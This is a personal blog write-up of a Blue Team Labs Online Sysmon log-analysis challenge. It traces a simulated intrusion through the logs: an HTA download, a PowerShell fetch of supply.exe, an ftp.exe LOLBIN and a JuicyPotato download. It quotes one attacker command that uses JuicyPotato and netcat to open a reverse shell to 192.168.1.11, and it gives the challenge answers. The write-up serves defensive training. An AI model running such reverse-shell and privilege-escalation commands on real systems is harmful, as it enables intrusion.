---
layout: post
title: Log Analysis - Sysmon
date: 2024-02-01 3:00 +0700
categories: [BTLO, Security Operations]
tags: [Text Editor, PowerShell, Linux CLI, Blue Team, btlo]     # TAG names should always be lowercase
img_path: '/assets/BTLO'
image: 
  path: logo.png
--- 

I have read the questions so I can temporarily skip question 1 because I have no idea how to do it

### 2) What is the powershell cmdlet used to download the malware file and what is the port? (2 points)

Let's try searching for `powershell` to see if there's anything there
> After I searched on the `mousepad`, it was quite a lot, so I grep it and export it to a file to make it easier to see

```
grep 'powershell' sysmon-events.json > powershell.json

```

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/178ab53e-cf10-4aa4-886c-9156287c5509)

it's quite... ummm like tinder in my eyes @~@

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/cb4959b3-154f-48fd-af15-de720536b7d2)

After sitting down and reading, I saw the problem here when it downloads files `supply.exe` from `192.168.1.11` with port `6969` 
> `Invoke-WebRequest` is a command in PowerShell to load content from a `URL` or interact with `web services`

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/c476cc72-c049-499e-b05f-f9de4eb954ea)

`INvoke-WebRequest, 6969`

After determining the address of the attacker, go through the original file to see if it still interacts with anything else

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/fc5f0f6e-a7a9-49dc-806a-a22978e9ce5b)


oh well, so I downloaded something from Chrrome and then go back to `question 1`

### What is the file that gave access to the attacker? (2 points)

I read it and everything was pretty normal until I saw a download of an `updater.hta` file .-.
> with `EventID: 15`

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/93d2024b-c47d-492a-8818-8e455a2d871a)

We will learn about each one one by one

I just found this [report](https://www.joesandbox.com/analysis/1305463/0/html) :)))

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/04246404-388e-43d9-8a1f-3425aa41e18a)


![Alt text](https://media.giphy.com/media/PUBxelwT57jsQ/giphy.gif?cid=ecf05e47pzmz36leierqqgy6pmwkp2668u9ed6sif8q77h3n&ep=v1_gifs_search&rid=giphy.gif&ct=g)


Information about [EventID :15](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90015)
> This event logs when a named file stream is created, and it generates events that log the hash of the contents of the file to which the stream is assigned (the unnamed stream), as well as the contents of the named stream. There are malware variants that drop their executables or configuration settings via browser downloads, and this event is aimed at capturing that based on the browser attaching a Zone.Identifier “mark of the web” stream.

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/62db1b68-9b12-4451-8998-1ea7b397b201)

From now on, it can be concluded that chrome is used to download `updater.hta` from hosting 192.168.1.11

Do you see `ZoneTransfer` with `ZoneId=3`?
> After researching on Google about [ZoneTransfer](https://michaelhidalgo.medium.com/sysmon-11-10-a-new-avenue-for-threat-detection-261fedbbe8b3)
```
0 — Local Machine Zone
1 — Local Intranet Zone
2 — Trusted Sites Zone
3 — Internet Zone
4 — Restricted Sites Zone
``` 
> So you know what `ZoneId=3` does, right ~

`updater.hta`

### 3) What is the name of the environment variable set by the attacker? (2 points)

After a morning of research, I found a blog about this issue [HUNTRESS](https://www.huntress.com/blog/from-powershell-to-payload-an-analysis-of-weaponized-malware)
> After reading, we know that `COMSPEC` is an environment variable and it usually points to cmd.exe

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/967c4045-cd8e-45e4-a464-33a6f2cb6b16)

`comspec=c:\Windows\temp\supply.exe`

### 4) What is the process used as a LOLBIN to execute malicious commands? (2 points)

Here is the document for your reference [Hunting for LoLBins](https://blog.talosintelligence.com/hunting-for-lolbins/)
> Simply put, it means taking advantage of any binary file provided by the operating system

after setting the environment variable `comspec` the binary file `ftp.exe` was executed

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/b31ba9ab-2fcc-494c-b608-e11060a20ecb)

`ftp.exe`

### 5) Malware executed multiple same commands at a time, what is the first command executed? (2 points)

I haven't done anything yet, just scrolled down and read it and boom!! kkk
> I see it executes the `ipconfig` command

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/95fb9530-850c-458a-a78c-329cf8159225)

`ipconfig` 

### 6) Looking at the dependency events around the malware, can you able to figure out the language, the malware is written (2 points)

After searching by `supply.exe`, see `python27.dll`, and yeh sure it is written in `python` code

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/0e23be30-7c88-49f0-a0b1-2fecd9539ea6)

`python`

### 7) Malware then downloads a new file, find out the full url of the file download (4 points)

Do you remember the powershell files we exported initially? Open them and you will see ~ 
> I suggest you can learn more about it here [juicy-potato](https://github.com/ohpe/juicy-potato)

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/c9566dc0-840a-453c-aeec-95bbee101e2d)

`https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe`

### 8) What is the port the attacker attempts to get reverse shell? (4 points)

After juicyPotato was downloaded, the attacker executed the following command
```
juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\

```

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/eb382701-fc28-4ae7-9d6c-dad682fde5fe)

`9898`

complete :_) 

![Alt text](https://media.giphy.com/media/JUADnkGLNv9n9eAPix/giphy.gif?cid=82a1493brjj1s7oqd1p1gg0fs50zdiyduzqpx7fo43dcqvsf&ep=v1_gifs_trending&rid=giphy.gif&ct=g)

goodbye, thank you for reading until now //~//


















